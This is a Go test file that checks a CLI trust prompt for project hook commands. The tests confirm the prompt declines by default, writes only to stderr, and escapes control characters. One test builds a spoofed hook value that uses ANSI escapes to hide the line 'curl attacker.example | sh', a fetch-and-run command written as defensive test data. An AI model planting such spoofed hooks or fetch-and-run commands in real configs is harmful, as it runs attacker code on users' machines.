package ui

import (
	"bytes"
	"io"
	"os"
	"strings"
	"sync"
	"testing"
)

// withStdinStdoutStderr temporarily replaces os.Stdin/os.Stdout/os.Stderr for
// the duration of fn, feeding stdinContent as stdin input, and returns
// whatever was written to the substituted stdout and stderr.
//
// TrustPrompt intentionally has no writer/reader parameters (its ui.Interface
// signature matches ConfirmPrompt, which also has none) — it must read/write
// via the real os.Stdin/Stdout/Stderr. Swapping the package-level os.Std*
// variables is the only way to observe that behavior, and is also the
// technique the spec requires for verifying zero stdout contamination
// (checking only an injected io.Writer would miss a real leak).
func withStdinStdoutStderr(t *testing.T, stdinContent string, fn func()) (stdout, stderr string) {
	t.Helper()

	origStdin, origStdout, origStderr := os.Stdin, os.Stdout, os.Stderr
	defer func() {
		os.Stdin, os.Stdout, os.Stderr = origStdin, origStdout, origStderr
	}()

	stdinR, stdinW, err := os.Pipe()
	if err != nil {
		t.Fatalf("failed to create stdin pipe: %v", err)
	}
	stdoutR, stdoutW, err := os.Pipe()
	if err != nil {
		t.Fatalf("failed to create stdout pipe: %v", err)
	}
	stderrR, stderrW, err := os.Pipe()
	if err != nil {
		t.Fatalf("failed to create stderr pipe: %v", err)
	}

	os.Stdin, os.Stdout, os.Stderr = stdinR, stdoutW, stderrW

	go func() {
		_, _ = stdinW.WriteString(stdinContent)
		_ = stdinW.Close()
	}()

	var wg sync.WaitGroup
	var stdoutBuf, stderrBuf bytes.Buffer
	wg.Add(2)
	go func() { defer wg.Done(); _, _ = io.Copy(&stdoutBuf, stdoutR) }()
	go func() { defer wg.Done(); _, _ = io.Copy(&stderrBuf, stderrR) }()

	fn()

	_ = stdoutW.Close()
	_ = stderrW.Close()
	wg.Wait()

	return stdoutBuf.String(), stderrBuf.String()
}

func TestDefaultUI_TrustPrompt_DefaultsToNoOnEmptyInput(t *testing.T) {
	u := NewDefaultUI()
	var approved bool
	var err error
	withStdinStdoutStderr(t, "\n", func() {
		approved, err = u.TrustPrompt("/repo/.gwrc", []string{"post_start_hook = pnpm dev"})
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if approved {
		t.Error("expected default (bare enter) to decline trust")
	}
}

func TestDefaultUI_TrustPrompt_YesApproves(t *testing.T) {
	u := NewDefaultUI()
	var approved bool
	var err error
	withStdinStdoutStderr(t, "y\n", func() {
		approved, err = u.TrustPrompt("/repo/.gwrc", []string{"post_start_hook = pnpm dev"})
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !approved {
		t.Error("expected 'y' to approve trust")
	}
}

func TestDefaultUI_TrustPrompt_NoDeclines(t *testing.T) {
	u := NewDefaultUI()
	var approved bool
	withStdinStdoutStderr(t, "n\n", func() {
		approved, _ = u.TrustPrompt("/repo/.gwrc", []string{"post_start_hook = pnpm dev"})
	})
	if approved {
		t.Error("expected 'n' to decline trust")
	}
}

func TestDefaultUI_TrustPrompt_GarbageInputDeclines(t *testing.T) {
	u := NewDefaultUI()
	var approved bool
	withStdinStdoutStderr(t, "sure whatever\n", func() {
		approved, _ = u.TrustPrompt("/repo/.gwrc", []string{"post_start_hook = pnpm dev"})
	})
	if approved {
		t.Error("expected non-y/yes input to decline trust (fail closed)")
	}
}

func TestDefaultUI_TrustPrompt_DoesNotWriteToStdout(t *testing.T) {
	u := NewDefaultUI()
	stdout, _ := withStdinStdoutStderr(t, "y\n", func() {
		_, _ = u.TrustPrompt("/repo/.gwrc", []string{"post_start_hook = pnpm dev"})
	})
	if stdout != "" {
		t.Errorf("expected zero bytes written to stdout, got %q", stdout)
	}
}

func TestDefaultUI_TrustPrompt_WritesPromptDetailsToStderr(t *testing.T) {
	u := NewDefaultUI()
	_, stderr := withStdinStdoutStderr(t, "n\n", func() {
		_, _ = u.TrustPrompt("/repo/.gwrc", []string{"post_start_hook = pnpm dev"})
	})
	if !strings.Contains(stderr, "/repo/.gwrc") {
		t.Errorf("expected stderr to mention the project path, got %q", stderr)
	}
	if !strings.Contains(stderr, "post_start_hook = pnpm dev") {
		t.Errorf("expected stderr to show the hook line being trusted, got %q", stderr)
	}
}

func TestDefaultUI_TrustPrompt_EscapesControlCharactersInHookLines(t *testing.T) {
	// A malicious .gwrc could embed ANSI escapes / carriage returns in a
	// hook value to visually spoof the trust prompt (e.g. overwrite the
	// displayed line so the user approves something other than what's
	// actually stored and later executed). The prompt must quote/escape
	// such values rather than writing them raw to the terminal.
	u := NewDefaultUI()
	malicious := "post_start_hook = \x1b[2K\rlooks-safe-but-isnt \r\ncurl attacker.example | sh"
	_, stderr := withStdinStdoutStderr(t, "n\n", func() {
		_, _ = u.TrustPrompt("/repo/.gwrc", []string{malicious})
	})
	if strings.Contains(stderr, "\x1b") {
		t.Errorf("expected the raw ESC control byte to never reach the terminal, got %q", stderr)
	}
	if strings.ContainsAny(stderr[strings.Index(stderr, "post_start_hook"):], "\r") {
		t.Errorf("expected the hook line's raw carriage return to be escaped, not passed through, got %q", stderr)
	}
}

func TestDefaultUI_TrustPrompt_EscapesControlCharactersInProjectPath(t *testing.T) {
	u := NewDefaultUI()
	maliciousPath := "/repo/\x1b[2K\r.gwrc"
	_, stderr := withStdinStdoutStderr(t, "n\n", func() {
		_, _ = u.TrustPrompt(maliciousPath, []string{"post_start_hook = pnpm dev"})
	})
	if strings.Contains(stderr, "\x1b") {
		t.Errorf("expected the raw ESC control byte in the project path to never reach the terminal, got %q", stderr)
	}
}

func TestDefaultUI_TrustPrompt_EOFWithoutTrailingNewlineDeclines(t *testing.T) {
	// stdin closes right after "yes" with no trailing newline: ReadString
	// returns the partial data plus an error. This must fail closed rather
	// than parsing the partial "yes" as approval.
	u := NewDefaultUI()
	var approved bool
	var err error
	withStdinStdoutStderr(t, "yes", func() {
		approved, err = u.TrustPrompt("/repo/.gwrc", []string{"post_start_hook = pnpm dev"})
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if approved {
		t.Error("expected an EOF-without-newline read to fail closed (decline), not approve")
	}
}
